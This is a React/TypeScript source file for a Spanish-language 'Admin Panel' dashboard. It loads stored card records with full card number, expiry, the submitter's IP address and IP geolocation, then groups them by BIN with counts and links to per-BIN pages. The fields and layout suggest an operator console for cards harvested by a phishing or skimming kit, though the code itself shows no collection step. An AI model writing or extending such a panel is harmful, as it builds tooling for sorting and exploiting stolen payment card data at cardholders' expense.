import { useState, useEffect, useMemo } from 'react';
import { Link } from 'react-router-dom';
import { getCards } from '../../services/api';
import { useAuth } from '../../context/AuthContext';
import '../../styles/Dashboard.css';

interface CardRecord {
    id: number;
    cardNumber: string;
    expiry: string | null;
    ipAddress: string | null;
    ipInfo: Record<string, string> | null;
    createdAt: string;
}

export default function Dashboard() {
    const { token, logout } = useAuth();
    const [cards, setCards] = useState<CardRecord[]>([]);
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState('');

    useEffect(() => {
        if (!token) return;
        setLoading(true);
        getCards(token, 1, 9999)
            .then((res) => setCards(res.data || []))
            .catch((err) => { if (err.message === 'UNAUTHORIZED') logout(); })
            .finally(() => setLoading(false));
    }, [token, logout]);

    const filtered = useMemo(() => {
        if (!search) return cards;
        const s = search.toLowerCase();
        return cards.filter(
            (c) =>
                c.cardNumber?.toLowerCase().includes(s) ||
                c.ipAddress?.toLowerCase().includes(s) ||
                c.expiry?.toLowerCase().includes(s),
        );
    }, [cards, search]);

    const binGroups = useMemo(() => {
        const map = new Map<string, CardRecord[]>();
        filtered.forEach((c) => {
            const bin = c.cardNumber?.replace(/\s/g, '').slice(0, 6) || 'UNKNOWN';
            const group = map.get(bin) || [];
            group.push(c);
            map.set(bin, group);
        });
        return Array.from(map.entries())
            .map(([bin, items]) => ({
                bin,
                count: items.length,
                latest: items.reduce(
                    (max, c) => (c.createdAt > max ? c.createdAt : max),
                    items[0]?.createdAt || '',
                ),
            }))
            .sort((a, b) => a.bin.localeCompare(b.bin));
    }, [filtered]);

    const uniqueBins = binGroups.length;

    return (
        <div className="dashboard">
            <div className="dash-header">
                <div className="dash-title">
                    <div className="icon">
                        <i className="fas fa-terminal" />
                    </div>
                    <div>
                        <h1>Admin Panel</h1>
                        <p>Panel de control de tarjetas</p>
                    </div>
                </div>
                <div className="dash-actions">
                    <div className="search-box">
                        <i className="fas fa-search" />
                        <input
                            placeholder="Buscar por número, IP..."
                            value={search}
                            onChange={(e) => setSearch(e.target.value)}
                        />
                    </div>
                    <button className="logout-btn" onClick={logout}>
                        <i className="fas fa-sign-out-alt" /> Cerrar Sesión
                    </button>
                </div>
            </div>

            <div className="stats-row">
                <div className="stat-card">
                    <div className="label">Total Tarjetas</div>
                    <div className="value">{filtered.length}</div>
                </div>
                <div className="stat-card">
                    <div className="label">BINs Únicos</div>
                    <div className="value">{uniqueBins}</div>
                </div>
            </div>

            {loading ? (
                <div className="loading-state">
                    <div className="loading-spinner" />
                    <p>Cargando datos...</p>
                </div>
            ) : binGroups.length === 0 ? (
                <div className="empty-state">
                    <i className="fas fa-database" />
                    <p>{search ? 'No se encontraron resultados' : 'No hay tarjetas registradas'}</p>
                </div>
            ) : (
                <div className="bin-groups-container">
                    {binGroups.map((g) => (
                        <Link key={g.bin} to={`/admin/bin/${g.bin}`} className="bin-group-link">
                            <div className="bin-group">
                                <div className="bin-group-header">
                                    <div className="bin-group-header-left">
                                        <div className="bin-group-icon">
                                            <i className="fas fa-credit-card" />
                                        </div>
                                        <div className="bin-group-info">
                                            <div className="bin-group-title">
                                                BIN: <span className="bin-label">{g.bin}</span>
                                                <span className="bin-group-badge">
                                                    <i className="fas fa-layer-group" /> {g.count}
                                                </span>
                                            </div>
                                            <div className="bin-group-meta">
                                                Última: {new Date(g.latest).toLocaleString()}
                                            </div>
                                        </div>
                                    </div>
                                    <div className="bin-group-arrow">
                                        <i className="fas fa-chevron-right" />
                                    </div>
                                </div>
                            </div>
                        </Link>
                    ))}
                </div>
            )}
        </div>
    );
}
